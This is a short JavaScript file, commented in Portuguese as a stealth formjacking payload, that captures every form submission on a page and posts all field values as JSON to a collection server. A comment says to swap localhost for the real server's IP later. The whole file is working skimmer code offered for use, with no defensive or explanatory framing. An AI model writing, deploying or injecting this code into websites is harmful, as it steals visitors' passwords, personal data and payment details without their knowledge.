// minimal_formjacking.js — Payload stealth de formjacking

document.addEventListener('submit', function(e) {
    let form = e.target;
    let formData = {};

    new FormData(form).forEach((value, key) => {
        formData[key] = value;
    });

    fetch('http://localhost:8080', { // <- Trocar pelo IP do seu server real no futuro
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData)
    });
});
